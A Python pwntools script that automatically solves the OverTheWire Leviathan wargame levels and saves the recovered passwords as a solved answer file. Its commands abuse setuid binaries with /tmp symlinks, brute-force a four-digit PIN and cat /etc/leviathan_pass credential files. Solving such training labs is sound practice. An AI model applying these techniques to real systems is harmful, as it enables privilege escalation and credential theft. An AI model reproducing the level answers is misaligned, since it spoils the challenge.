#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# script by imol.ai

import json
from pwn import *

context.log_level = 'error'

# List of collected flags
flags = ['leviathan0']

# ANSI color codes (used for text colors)
Green = '\x1b[32m'
White = '\x1b[37m'
Purple = '\x1b[35m'
Blue = '\x1b[36m'
D_Blue = '\x1b[34m'
Red = '\x1b[31m'
Amber = '\x1b[33m'


################## helper functions ##################

##### lv_connect = establishes an ssh connection #####
# num = int: level value to connect to
# return = connected ssh channel object
def lv_connect(num, raw=False):
	user = 'leviathan' + str(num)
	print(Green + f'Starting Leviathan Level: ' + str(num) + White)
	return ssh(user, 'leviathan.labs.overthewire.org', password=flags[num], port=2223, raw=raw)

##### flag_print = prints flag found and add to list #####
# s = int: start of flag string junk data to remove
# e = int: end of flag string junk data to remove
def flag_print(s=0, e=None):
	strippedFlag = flag[s:-e if e else None]
	flags.append(strippedFlag)
	print(Green + 'Leviathan' + str(lv) + ' flag = ' + Red + flags[lv+1] + White)
	shell.close()

############### leviathan level functions ###############

def leviathan0():
	global flag, shell
	shell = lv_connect(lv).system('sh')
	shell.recvuntil(b'$ ')
	flag = re.findall(r'This will be fixed later, the password for leviathan1 is ([^ ]+?)"', shell.sendlinethen(b'$ ', b'grep leviathan .backup/bookmarks.html').decode())[0]
	flag_print()

def leviathan1():
	global flag, shell
	shell = lv_connect(lv).system('sh')
	shell.sendline(b'./check')
	shell.sendlineafter(b'password: ', b'sex')
	shell.sendlineafter(b'$ ', b'cat /etc/leviathan_pass/leviathan2')
	flag = shell.recvline().decode().strip()
	flag_print()

def leviathan2():
	global flag, shell
	shell = lv_connect(lv).system('sh')
	shell.sendlineafter(b'$ ', b'cd /tmp; rm -f getr ennt "getr ennt"; ln -s /etc/leviathan_pass/leviathan3 getr; touch ennt "getr ennt"')
	shell.sendlineafter(b'$ ', b'~/printfile "getr ennt"')
	flag = shell.recvline().decode().strip()
	flag_print()

def leviathan3():
	global flag, shell
	shell = lv_connect(lv).system('sh')
	shell.sendline(b'./level3')
	shell.sendlineafter(b'Enter the password> ', b'snlprintf')
	shell.sendlineafter(b'$ ', b'cat /etc/leviathan_pass/leviathan4')
	flag = shell.recvline().decode().strip()
	flag_print()

def leviathan4():
	global flag, shell
	shell = lv_connect(lv).system('sh')
	shell.sendlineafter(b'$ ', b'.trash/bin')
	flag = ''.join([chr(int(i, 2)) for i in shell.recvline().decode().strip().split(' ')])[:-1]
	flag_print()

def leviathan5():
	global flag, shell
	shell = lv_connect(lv).system('sh')
	shell.sendlineafter(b'$ ', b'ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log')
	shell.sendlineafter(b'$ ', b'./leviathan5')
	flag = shell.recvline().decode().strip()
	flag_print()

def leviathan6():
	global flag, shell
	shell = lv_connect(lv).system('bash')
	shell.sendlineafter(b'$ ', b'for i in {0000..9999}; do ./leviathan6 $i; done')
	shell.sendlineafter(b'$ ', b'cat /etc/leviathan_pass/leviathan7')
	flag = shell.recvline().decode().strip()
	flag_print()

def leviathan7():
	# "Well Done, you seem to have used a *nix system before, now try something more serious."
	pass


################# Runner #################

if __name__ == '__main__':
	try:
		for lv in range(0, 7):
			eval('leviathan'+str(lv))()
	finally:
		print(flags)

		with open("leviathan.json", "r") as file:
			data = json.load(file)
		for i in data:
			if len(flags) > i['id']:
				i["target"] = f"sshpass -p {flags[i['id']]} ssh leviathan{i['id']}@leviathan.labs.overthewire.org -p 2223"
			if len(flags) > i['id']+1:
				i["flag"] = flags[i['id']+1]
		with open('leviathan_solved.json', 'w') as filp:
			json.dump(data, filp, indent='\t')
